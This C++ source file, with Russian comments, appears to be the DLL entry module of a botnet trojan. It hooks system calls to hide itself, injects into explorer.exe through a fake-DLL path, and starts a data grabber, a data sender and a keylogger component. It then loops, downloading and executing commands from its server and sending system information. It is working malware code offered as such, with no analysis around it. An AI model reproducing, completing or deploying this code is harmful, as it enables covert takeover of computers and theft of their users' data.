// dllmain.cpp: определяет точку входа для приложения DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"


#include "Crypt.h"

#include "Modules.h"

#include "ntdll.h"

#include "coocksol.h"

#include "md5.h"

#include "DbgRpt.h"

#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  Система отладочных строк
//------------------------------------------------------------------------------
#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
DWORD dwWebMoneySelf = 0;

//DWORD dwExplorerPid  = 0; //пид эксплорера

DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");

	BOT::Initialize();
	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Регистрируем глобальный менеджер задач
	InitializeTaskManager(NULL, true);

	// Инициализируем систему отправки статистической информации
	DebugReportInit();

	// 402_pl запуск цикла получения команд (он получается в другом процессе)
	DebugReportStepByName("402_pl");

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}




	// Запускаем поток отправки данных
	DataGrabber::StartDataSender();

	// Стартуем поток обновления списка процессов кейлогера
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
	while (true)
	{
		// 403_pl цикл получения команд
		DebugReportStepByName("403_pl");
		
		DownloadAndExecuteCommand(NULL, NULL);

		// "Гениальность" проектирования взаимосвязи бота и его сервера
		// отправка стартовой информации должна идти только после получения
		// команды
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
			FirstSended = SendFirstInfo();
		}


		// Приостанавливаем выполнение команд
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}

DWORD WINAPI ExplorerMain(LPVOID Data)
{
	BOT::Initialize();

	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
	
	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Инициализируем систему отправки статистической информации
	DebugReportInit();

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	// 401_pl запуск BotPlug
	DebugReportStepByName("401_pl");

	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
	MegaJump( LoaderRoutine );

	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "Стартуем грабер");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// Вызываем событие мтарта експлорера

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}

extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
{
	StartThread(ExplorerMain, NULL);
}

BOOL APIENTRY MyDllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{

	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			//StartThread(ExplorerMain, NULL);
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}


// Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
{
	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
	// При загрузке просто вызывает Start, предусмотренную для
	// обычного запуска Bot.plug
	Start(NULL, NULL, NULL);
	return 0;
}

// Експортируемая ф-ция для запуска Bot.plug из FakeDll.
BOOL WINAPI StartFromFakeDll()
{
	DLLDBG("StartFromFakeDll", "Started.");

	// Смотрим на то - запущен ли бот
	HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();

	DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
	if (BotInstanceMutex == NULL) return FALSE;
	pCloseHandle(BotInstanceMutex); //закрываем мютекс, чтобы его снова создали в процессе explorer.exe

	return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
}
